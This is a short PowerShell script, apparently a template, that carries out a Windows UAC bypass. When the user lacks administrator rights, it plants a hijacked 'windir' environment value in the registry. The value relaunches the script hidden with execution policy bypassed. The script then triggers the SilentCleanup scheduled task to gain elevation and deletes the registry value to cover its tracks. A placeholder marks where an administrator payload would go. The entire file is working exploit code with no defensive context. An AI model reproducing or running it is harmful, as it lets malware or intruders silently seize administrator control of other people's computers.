if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
	#Payload to run as Admin
} else{
	$registryPath = "HKCU:\Environment"
	$Name = "windir"
	$Value = "powershell -ep bypass -w h $PSCommandPath;#"
	Set-ItemProperty -Path $registryPath -Name $name -Value $Value
	#Delay 500
	schtasks /run /tn \Microsoft\Windows\DiskCleanupSilentCleanup /I | Out-Null
	Remove-ItemProperty -Path $registryPath -Name $name
}